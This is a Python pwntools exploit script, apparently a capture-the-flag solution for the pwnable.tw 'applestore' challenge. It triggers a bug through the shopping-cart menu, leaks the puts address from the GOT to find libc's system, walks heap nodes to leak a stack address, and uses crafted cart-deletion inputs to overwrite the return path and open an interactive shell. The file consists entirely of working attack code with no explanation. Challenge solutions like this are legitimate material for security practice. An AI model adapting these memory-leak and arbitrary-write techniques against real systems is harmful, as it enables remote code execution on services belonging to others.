from pwn import *

p32 = lambda x: struct.pack("<L",x) #unsigned long
up32 = lambda x: struct.unpack("<L", x)[0] #unpack unsigned long


addr = "chall.pwnable.tw"
port = 10104

binary = "./applestore"

elf = ELF(binary)
elf.bss()

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

libc = ELF("./libc_32.so.6")
system_offset = libc.symbols['puts'] - libc.symbols['system']

s = remote(addr, port)

def Menu():
    sleep(0.3)
    print s.recvuntil("=== Menu ===")
    print s.recvuntil("1: Apple Store")
    print s.recvuntil("2: Add into your shopping cart")
    print s.recvuntil("3: Remove from your shopping cart")
    print s.recvuntil("4: List your shopping cart")
    print s.recvuntil("5: Checkout")
    print s.recvuntil("6: Exit")
    print s.recvuntil(">")

def Add(_number):
    s.send("2")
    sleep(0.1)
    print s.recvuntil("Device Number> ")
    s.sendline(_number)
    sleep(0.1)
    print s.recvuntil("You've put *")
    print s.recvuntil("* in your shopping cart.")
    print s.recvuntil("Brilliant! That's an amazing idea.")
    print s.recvuntil(">")
   
def Checkout():
    s.send("5")
    sleep(0.3)
    print s.recvuntil("Let me check your cart. ok? (y/n) >")
    s.sendline("y")
    sleep(0.3)
    print s.recvuntil("==== Cart ====")
    print s.recvuntil("Want to checkout? Maybe next time!")
    print s.recvuntil(">")

def Delete(_name, _price, _next, _prev, _ret=None):
    if _ret == None:
        s.send("3")
    else:
        s.send("3\x00\x00\x00"+_ret)
    sleep(0.3)
    print s.recvuntil("Item Number> ")
    s.send("27" + _name + _price + _next + _prev)
    
def trigger():
    for i in range(0,26):
        if i > 19:
            Add("1")
        else: 
            Add("2")
    Checkout()

def leak(_name, _price, _next, _prev):
    s.send("4")
    sleep(0.3)
    print s.recvuntil("Let me check your cart. ok? (y/n) >")
    s.send("yA" + _name + _price + _next + _prev)
    sleep(0.3)
    print s.recvuntil("==== Cart ====")
    print s.recvuntil("27: ")
    _leak = up32(s.recv(4))
    print s.recvuntil(">")
    return _leak
 
def exploit():
    root = 0x0804B068 # ROOT Node
    arbitrary = 0x0804B000 #got.plt

    #library leak
    puts_libc = leak(p32(puts_got), "AAAA", "\x00\x00\x00\x00", "\x00\x00\x00\x00")
    system_libc = puts_libc - system_offset
    one_shot = system_libc - 0x127
    print "[+] puts_libc : %x" % puts_libc
    print "[+] system_libc : %x" % system_libc
    print "[+] one_shot : %x" % one_shot

    #stack leak
    node = root
    for i in range(0,27):
        next_node = leak(p32(node +0x8), "AAAA", "\x00\x00\x00\x00", "\x00\x00\x00\x00")
        print "[+] next_node : %x" % next_node
        node = next_node
    ebp = node + 0x20
    ret = ebp + 0x4
    sfp = leak(p32(ebp), "AAAA", "\x00\x00\x00\x00", "\x00\x00\x00\x00")

    #for ret overwrite
    Delete(p32(arbitrary), "AAAA", p32(ebp-0xC), p32(sfp+0x22))

    #for stack canary
    Delete(p32(arbitrary), "AAAA", p32(ebp-0xC), p32(sfp), p32(one_shot))

    s.send("6")



Menu()

trigger()

exploit()

s.interactive()
s.close()
